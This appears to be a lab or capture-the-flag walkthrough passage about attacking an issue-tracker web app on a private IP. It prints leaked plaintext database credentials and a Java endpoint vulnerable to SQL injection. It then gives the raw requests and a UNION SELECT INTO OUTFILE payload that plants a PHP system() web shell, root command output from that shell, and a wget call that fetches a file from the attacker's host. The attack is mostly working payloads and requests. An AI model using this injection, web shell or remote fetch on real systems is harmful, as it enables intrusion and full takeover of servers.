# 6 :50080 nextcloud enum

```
# found a file called issuetracker.zip

# interesting file at 
$ cat issuetracker/src/main/resources/application.properties
spring.datasource.url=jdbc:mysql://localhost:3306/issue_tracker?serverTimeZone=UTC
spring.datasource.username=issue_user
spring.datasource.password=ManagementInsideOld797
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
server.port=17445

# can't do anything with these creds
# exploring the code to understand any vulnerable function
# function stands out

@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);

        } catch (SQLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
        // TODO: Return the list of the issues with the correct priority
		List<Issue> issues = service.GetAll();
		model.addAttribute("issuesList", issues);
		return "issue_index";
        
	}

# this looks interesting 
# all functions are small but this `/issue/checkByPriority` has custom code

@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
[truncated]
	
String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
Statement stmt = conn.createStatement();
System.out.println(query);
stmt.executeQuery(query);

# Logging in > fresh session > capture request and modify to >
GET /issue/checkByPriority?priority=Normal HTTP/1.1
Host: 192.168.136.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://192.168.136.147:17445/
Cookie: JSESSIONID=9F60BBD237C0438959D5C4B5C576D10D

# reponse
There was an unexpected error (type=Method Not Allowed, status=405).

# maybe POST?
POST /issue/checkByPriority?priority=Normal HTTP/1.1
Host: 192.168.136.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://192.168.136.147:17445/
Cookie: JSESSIONID=9F60BBD237C0438959D5C4B5C576D10D
Content-Type: application/x-www-form-urlencoded
Content-Length: 15


# response
page loads successfully
Normal' UNION SELECT "<?php echo system($_GET['cmd']);" INTO OUTFILE '/srv/http/kashz.php'; -- 

Using https://www.url-encode-decode.com/
Normal%27+UNION+SELECT+%22%3C%3Fphp+echo+system%28%24_GET%5B%27cmd%27%5D%29%3B%22+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fkashz.php%27%3B+--+

# send payload
POST /issue/checkByPriority?priority=Normal%27+UNION+SELECT+%22%3C%3Fphp+echo+system%28%24_GET%5B%27cmd%27%5D%29%3B%22+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fb.php%27%3B+--+ HTTP/1.1
Host: 192.168.136.147:17445
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://192.168.136.147:17445/
Cookie: JSESSIONID=9F60BBD237C0438959D5C4B5C576D10D
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

# response
HTTP/1.1 200 

http://192.168.136.147:30455/kashz.php?cmd=whoami;id
root
uid=0(root) gid=0(root) groups=0(root) uid=0(root) gid=0(root) groups=0(root)

# web shell
http://192.168.136.147:30455/kashz.php?cmd=wget%20192.168.49.136:50080/web.php
```
